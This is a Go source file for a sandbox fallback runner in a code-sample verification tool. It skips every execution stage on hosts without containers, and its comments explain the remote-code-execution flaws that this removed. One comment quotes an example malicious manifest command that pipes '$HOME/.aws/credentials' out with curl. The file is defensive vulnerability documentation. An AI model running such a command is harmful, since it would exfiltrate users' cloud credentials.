package sandbox

import (
	"context"

	"github.com/r2cuerdame/codesamplex/internal/domain"
)

// NativeRunner is what a host without container isolation gets, and it
// executes NOTHING from a sample.
//
// It used to run two stages natively, and both were remote code execution.
//
//	Build ran m.BuildCommand — an argv taken verbatim from a downloaded,
//	unsigned manifest — as the user, with no isolation. Publishing a sample
//	carrying {"buildCommand":["sh","-c","curl -T $HOME/.aws/credentials …"]}
//	was enough: the next Docker-less peer with idle verification enabled
//	claimed the job and ran it. A second door needed no cross-verification
//	at all, because get_sample caches any network sample locally and
//	`csx sample verify <id>` then unpacks and builds it.
//
//	Resolve ran a fixed per-ecosystem command, which sounds safer and is
//	not: `pip install -r requirements.txt` executes setup.py from any sdist
//	the sample names, and `cargo fetch`/`cargo build` runs build.rs. The
//	attacker controls the dependency list even when they do not control the
//	argv. It also wrote to /work/.csx-vendor, an absolute path that on a
//	native host is nowhere near the sample directory.
//
// The package header has always said "Downloaded samples never run
// directly on the host", and only the Contract stage honoured it.
//
// So COMPILE_ONLY now means what it can honestly mean on a host with no
// sandbox: nothing ran, and the receipt says so at every stage. That costs
// Docker-less machines their ability to contribute verification — which is
// the correct price, because they cannot verify safely, and a receipt from
// a machine that executed the sample it was judging would be worth less
// than none.
type NativeRunner struct{}

// nativeSkip is the reason attached to every stage.
const nativeSkip = "no container isolation on this host (COMPILE_ONLY): " +
	"a downloaded sample is never executed outside a sandbox, so this stage did not run"

// Resolve does not fetch: dependency resolution executes code in most
// ecosystems (setup.py, build.rs, lifecycle scripts), and the sample
// chooses the dependencies.
func (NativeRunner) Resolve(context.Context, string, domain.SampleManifest) StageResult {
	return skipped(nativeSkip)
}

// Build does not run the manifest's command. The command comes from the
// sample.
func (NativeRunner) Build(context.Context, string, domain.SampleManifest) StageResult {
	return skipped(nativeSkip)
}

// Contract never ran here, and still does not.
func (NativeRunner) Contract(context.Context, string, domain.SampleManifest) StageResult {
	return skipped(nativeSkip)
}

// StageEnvironment is the host environment. Nothing ran, so there is no
// container to describe, and claiming one would be the same lie in the
// other direction.
func (NativeRunner) StageEnvironment(host domain.EnvironmentFingerprint, _ domain.SampleManifest) domain.EnvironmentFingerprint {
	return host.Normalize()
}

// VerifierImage is nil: the native fallback runs on the host, so there is
// no image and nothing to record. Reporting a pinned image here would put a
// container's identity on a receipt for a run that never entered one.
func (NativeRunner) VerifierImage(domain.SampleManifest) *domain.VerifierImage { return nil }
